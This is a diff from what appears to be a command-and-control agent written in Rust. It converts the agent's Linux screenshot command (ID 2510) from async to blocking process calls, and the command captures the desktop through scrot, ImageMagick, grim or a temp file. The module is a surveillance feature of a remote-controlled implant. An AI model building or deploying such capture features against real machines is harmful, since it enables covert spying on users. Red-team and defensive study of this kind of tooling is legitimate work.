@@ -1,10 +1,9 @@
 //! `CommandScreenshot` (ID 2510): Linux desktop capture.
 
 use std::fs;
-use std::process::Stdio;
+use std::process::{Command, Stdio};
 
 use red_cell_common::demon::DemonCommand;
-use tokio::process::Command;
 
 use crate::error::PhantomError;
 
@@ -77,7 +76,6 @@ async fn capture_screenshot() -> Result<Vec<u8>, PhantomError> {
         .stdout(Stdio::piped())
         .stderr(Stdio::null())
         .output()
-        .await
     {
         if output.status.success() && !output.stdout.is_empty() {
             tracing::debug!("screenshot captured via scrot");
@@ -91,7 +89,6 @@ async fn capture_screenshot() -> Result<Vec<u8>, PhantomError> {
         .stdout(Stdio::piped())
         .stderr(Stdio::null())
         .output()
-        .await
     {
         if output.status.success() && !output.stdout.is_empty() {
             tracing::debug!("screenshot captured via import (ImageMagick)");
@@ -101,7 +98,7 @@ async fn capture_screenshot() -> Result<Vec<u8>, PhantomError> {
 
     // Method 4: grim (Wayland native)
     if let Ok(output) =
-        Command::new("grim").arg("-").stdout(Stdio::piped()).stderr(Stdio::null()).output().await
+        Command::new("grim").arg("-").stdout(Stdio::piped()).stderr(Stdio::null()).output()
     {
         if output.status.success() && !output.stdout.is_empty() {
             tracing::debug!("screenshot captured via grim (Wayland)");
@@ -116,7 +113,6 @@ async fn capture_screenshot() -> Result<Vec<u8>, PhantomError> {
         .stdout(Stdio::null())
         .stderr(Stdio::null())
         .output()
-        .await
     {
         if output.status.success() {
             if let Ok(data) = fs::read(tmp_path) {
